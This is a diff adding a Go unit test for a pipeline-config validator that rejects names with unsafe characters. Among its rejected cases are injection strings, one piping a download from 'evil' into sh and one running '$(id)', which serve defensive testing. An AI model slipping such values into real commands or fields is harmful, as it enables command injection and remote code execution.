@@ -1,6 +1,7 @@
 package pipelines_test
 
 import (
+	"fmt"
 	"strings"
 	"testing"
 
@@ -136,6 +137,47 @@ pipelines:
 	_, err := pipelines.Parse(strings.NewReader(yaml))
 	if err == nil {
 		t.Fatal("expected missing-name error")
+	}
+}
+
+func TestValidate_NameCharset(t *testing.T) {
+	cases := []struct {
+		name  string
+		valid bool
+	}{
+		{"lint", true},
+		{"pre-commit", true},
+		{"build_images", true},
+		{"v0.6.0-check", true},
+		{"9lives", true},
+		{"-leading-dash", false},
+		{".leading-dot", false},
+		{"has space", false},
+		{"gate; curl https://evil/x | sh #", false},
+		{"$(id)", false},
+		{"a/b", false},
+		{"tab\tname", false},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			cfg := pipelines.Config{Pipelines: []pipelines.Pipeline{{Name: tc.name, Entrypoint: "A"}}}
+			err := cfg.Validate()
+			if tc.valid {
+				if err != nil {
+					t.Fatalf("Validate(%q): %v", tc.name, err)
+				}
+				return
+			}
+			if err == nil {
+				t.Fatalf("Validate(%q): expected a charset error", tc.name)
+			}
+			if !strings.Contains(err.Error(), "name must match") {
+				t.Fatalf("unexpected error: %v", err)
+			}
+			if !strings.Contains(err.Error(), fmt.Sprintf("%q", tc.name)) {
+				t.Fatalf("error should name the offending pipeline: %v", err)
+			}
+		})
 	}
 }
 
